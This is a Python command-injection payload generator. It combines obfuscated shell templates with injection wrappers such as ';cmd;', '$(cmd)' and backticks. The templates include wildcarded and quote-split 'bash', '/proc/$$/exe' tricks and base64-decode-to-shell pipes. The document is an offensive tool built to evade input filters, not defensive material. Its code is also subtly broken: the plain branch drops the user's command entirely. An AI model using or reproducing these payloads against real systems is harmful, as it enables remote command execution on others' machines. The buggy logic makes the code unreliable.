import argparse
from sys import argv
from base64 import b64encode

obs = ["/bin/bash <(echo cmd)",'echo cmd|/bin/sh||echo cmd|/bin/bash',"/bin/sh <(echo cmd)","/b?n/b?s? cmd",";bash -c $(echo cmd)","echo cmd | `readlink /proc/$$/exe`","echo cmd | $(readlink /proc/$$/exe)","/b'i'n/'b'as'h' -c cmd",
"o='b';k='s';q='h';i='a';$o$i$k$q -c cmd",';echo cmd|/?i?/ba??']

exec_ = [";cmd;","$(cmd)","`cmd`","()cmd"]

base64 = ["/b?n/b?sh -c \"echo cmd |base64 -d | /b?n/b?sh\" ",'echo cmd|base64 -d |/bin/sh||echo cmd|base64 -d |/bin/bash',
"echo `echo cmd |base64 -d `|bash;$(echo cmd|$(which base64) -d)|bash",
"`echo cmd | base64 -d`",";bash <(``echo cmd |base64 -d``)","echo $(echo cmd |`which base64` -d) | `readlink /proc/$$/exe`"," echo $(echo cmd | base64 -d ) |  ``$(readlink /proc/$$/exe)``","/b'i'n/'b'as'h' -c \"echo $(echo cmd |base64 -d )\"",
"o='b';k='s';q='h';i='a';$o$i$k$q -c \"echo 'cmd' | base64 -d | $o$i$k$q \"",';echo cmd|base64 -d | /?i?/ba??',"echo $(``readlink /proc/$$/exe``) -c 'echo  $(echo cmd |base64 -d)'"]

def main():
	parser = argparse.ArgumentParser(description="Command injection payload generator.")
	parser.add_argument("-c",dest="cmd",help="Command",required=True)
	parser.add_argument("-b64",dest="b64",help="Encode payload",action="store_true")
	args = parser.parse_args()
	cmd = args.cmd;cmd_ = str()

	if not  args.b64 is False:
		b64 = b64encode(cmd.encode())
		cont = 0
		for k in base64:
			for j in exec_:
				k = k.replace('cmd',b64.decode())
				j = j.replace('cmd',k)
				cont += 1
				print("Payload [{}] {}".format(str(cont),j))
	else:
		cont = 0
		for k in obs:
			for j in exec_:
				k = k.replace('cmd',cmd_)
				j = j.replace('cmd',k)
				cont += 1
				print("Payload [{}] {}".format(str(cont),j))

if __name__ == '__main__':
	main()
